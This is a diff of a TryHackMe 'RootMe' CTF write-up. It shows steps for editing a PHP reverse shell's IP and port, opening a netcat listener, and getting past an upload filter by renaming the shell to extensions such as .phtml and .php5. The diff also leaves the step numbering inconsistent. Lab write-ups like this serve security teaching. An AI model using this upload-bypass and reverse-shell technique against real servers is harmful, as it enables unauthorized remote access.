@@ -87,6 +87,7 @@ DOWNLOADED: 9224 - FOUND: 3
 ┌──(kali㉿kali)-[~]
 └─$ firefox http://10.10.53.28/panel
 ```
+
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20RootMe/Panel%20Directory.png)
 
 # Vulnerability Exploitation
@@ -120,17 +121,19 @@ CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  LICENSE  php-reverse-shell.ph
 └─$ sudo gedit php-reverse-shell.php 
 ```
 11. We'll change the value in the $ip variable to our attacking machine's IP address and the value of the $port variable to the port that we'll use for the Netcat listener that we'll set up to listen for any incoming connection
+
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20RootMe/Setting%20Up%20PHP%20Reverse%20Shell.png)
-12. `CTRL + S` to the save the changes we've made to the php-reverse-shell.php file
-13. `nc -lvnp {PORT NUMBER}` to open up a Netcat listener on the specified port
+13. `CTRL + S` to the save the changes we've made to the php-reverse-shell.php file
+14. `nc -lvnp {PORT NUMBER}` to open up a Netcat listener on the specified port
 ```bash
 ┌──(kali㉿kali)-[~/php-reverse-shell]
 └─$ nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
 14. Attempting to upload the PHP file displays an "Error sending the file!" message
+
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20RootMe/PHP%20Not%20Permitted.png)
-15. Since this is a PHP reverse shell, we can create copies of this PHP reverse shell with these different PHP extensions: **.phps**, **.phtml**, **.php3**, **.php4**, and **.php5**
+16. Since this is a PHP reverse shell, we can create copies of this PHP reverse shell with these different PHP extensions: **.phps**, **.phtml**, **.php3**, **.php4**, and **.php5**
 
 `cp php-reverse-shell.php php-reverse-shell.phtml`
 
@@ -143,9 +146,10 @@ Listening on [0.0.0.0] (family 0, port 9999)
 `cp php-reverse-shell.php php-reverse-shell.phps`
 
 16. `firefox http://{TARGET IP}/uploads` to see the files that we managed to successfully upload onto the target system
+  
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20RootMe/Uploads%20Directory.png)
-17. Although we managed to successfully upload four out of the five different PHP versions, only two of them (**.phtml** and **.php5**) are able to be executed and connect back to our Netcat listener without any problem
-18. `whoami` to see who we managed to connect to the server as
+18. Although we managed to successfully upload four out of the five different PHP versions, only two of them (**.phtml** and **.php5**) are able to be executed and connect back to our Netcat listener without any problem
+19. `whoami` to see who we managed to connect to the server as
 ```bash
 Listening on [0.0.0.0] (family 0, port 9999)
 Connection from 10.10.53.28 50572 received!
